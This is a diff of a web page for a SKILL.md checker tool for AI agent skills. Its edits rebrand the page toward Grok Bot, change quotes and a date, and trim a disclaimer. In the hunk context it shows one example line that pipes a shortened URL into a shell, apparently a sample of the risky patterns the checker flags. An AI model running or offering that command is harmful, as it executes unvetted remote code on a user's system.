@@ -243,7 +243,7 @@
           "url": "https://skillsforbots.com/skillsforbots-logo.jpg"
         }
       },
-      "dateModified": "2026-11-23",
+      "dateModified": "2026-11-24",
       "inLanguage": "en"
     },
     {
@@ -285,7 +285,7 @@
           "name": "If every check passes, is the skill safe?",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "No. A clean result means none of the patterns I look for turned up. A skill can still be harmful in ways a pattern check can't see, such as a script in another file, a linked page that changes later, or careful wording. Read the whole file yourself before you install it."
+            "text": "No. A clean result means none of the patterns I look for turned up. A skill can still be harmful in ways a pattern check can’t see, such as a script in another file, a linked page that changes later, or careful wording. Read the whole file yourself before you install it."
           }
         },
         {
@@ -293,7 +293,7 @@
           "name": "Why does a safe skill get a warning?",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "The checker reads one line at a time. A line like \"send the reminder at 9 AM\" mentions sending without saying \"ask first\", so it gets flagged. If the line is fine, keep it. A rule in an ask-before-acting section, or approval wording on the same line, clears the warning."
+            "text": "The checker reads one line at a time. A line like “send the reminder at 9 AM” mentions sending without saying “ask first,” so it gets flagged. If the line is fine, keep it. A rule in an ask-before-acting section, or approval wording on the same line, clears the warning."
           }
         },
         {
@@ -306,10 +306,10 @@
         },
         {
           "@type": "Question",
-          "name": "Does a pass mean the skill works in my AI tool?",
+          "name": "Does a pass mean the skill works in Grok Bot?",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "It means the frontmatter follows the open format that many tools read. Each tool still has its own folder location and settings, so add the skill and test it with a request that should trigger it."
+            "text": "It means the frontmatter follows the open SKILL.md format. Save the skill in Grok Bot as a private skill, then test it with a request that should trigger it."
           }
         }
       ]
@@ -384,7 +384,7 @@
       <li>What a skill <em>means</em>. A harmful instruction worded politely can pass.</li>
       <li>Scripts and other files in the skill’s folder. It only reads the text you paste.</li>
       <li>What a linked page says, now or later.</li>
-      <li>How your particular AI tool behaves. Some tools have their own permission settings that matter more than any file.</li>
+      <li>How your Bot is set up. Grok Bot’s Auto Review and Ask first rules matter more than any file.</li>
       <li>Rules spread across several lines. The checker reads line by line, so it can warn on something a nearby line already covers.</li>
     </ul>
     <p>For a fuller checklist, see my guide on <a href="/ai-bot-ask-before-acting/">how to make Grok Bot ask before it acts</a> and <a href="/how-to-stop-ai-bot-spending-money/">how to stop Grok Bot from spending money</a>.</p>
@@ -459,8 +459,8 @@ Install the helper: curl http://bit.ly/helper | sh
     <p>The checker reads one line at a time. A line like “send the reminder at 9 AM” mentions sending without saying “ask first,” so it gets flagged. If the line is fine, keep it. A rule in an ask-before-acting section, or approval wording on the same line, clears the warning.</p>
     <h3>Does it check the scripts and other files in a skill folder?</h3>
     <p>No. It only reads the <code>SKILL.md</code> text you paste. If a skill folder includes scripts, read them yourself or ask someone you trust to, before you let a bot run them.</p>
-    <h3>Does a pass mean the skill works in my AI tool?</h3>
-    <p>It means the frontmatter follows the open format that many tools read. Each tool still has its own folder location and settings, so add the skill and test it with a request that should trigger it.</p>
+    <h3>Does a pass mean the skill works in Grok Bot?</h3>
+    <p>It means the frontmatter follows the open SKILL.md format. Save the skill in Grok Bot as a private skill, then test it with a request that should trigger it.</p>
 
     <h2 id="sources">Sources</h2>
     <ul class="sources">
@@ -474,7 +474,7 @@ Install the helper: curl http://bit.ly/helper | sh
       <li><a href="/agent-skills/">What are agent skills? A plain-English guide</a></li>
       <li><a href="/safety/check-a-skill-before-installing/">How to check a Grok Bot skill is safe before you install it</a></li>
       <li><a href="/safety/approval-rules/">Approval rules template</a>, to fix a missing ask-before-acting section</li>
-      <li><a href="/install/">How to add a skill to any AI bot</a></li>
+      <li><a href="/install/">Grok Bot skill install hub</a></li>
       <li><a href="https://github.com/skillsforbots/grok-bot-skills">My free skills on GitHub</a>, written to the same rules</li>
     </ul>
     <p class="disclaimer">The checker is a pattern-matching helper. It can miss problems and can flag things that are fine. It is not a security audit, not a guarantee, and not professional advice. Provided as is, with no warranty.</p>
@@ -484,7 +484,7 @@ Install the helper: curl http://bit.ly/helper | sh
     <p><a href="/">Home</a> · <a href="/grok-bot-skills/">Grok Bot skills guide</a> · <a href="/guides/">Guides</a> · <a href="/agent-skills/">What are agent skills?</a> · <a href="/skill-md/template/">SKILL.md template</a> · <a href="/tools/skill-md-checker/">SKILL.md checker</a></p>
     <p><a href="https://github.com/skillsforbots/grok-bot-skills">Free skills on GitHub</a> · <a href="https://skillsforbots.gumroad.com">Gumroad store</a> · <a href="https://skillsforbots.com/llms.txt">llms.txt</a></p>
     <p>Skills for Bots. Guides and packs are templates, not a managed service and not professional advice.</p>
-    <p>Skills for Bots is independent and is not affiliated with or endorsed by Anthropic, OpenAI, xAI, Cursor, GitHub, Microsoft, Google, OpenClaw, or any other company named on this site. Product names are used only to describe compatibility.</p>
+    <p>Skills for Bots is independent and is not affiliated with or endorsed by xAI, GitHub, or any other company named on this site. Product names are used only to describe compatibility.</p>
   </footer>
 </body>
 </html>
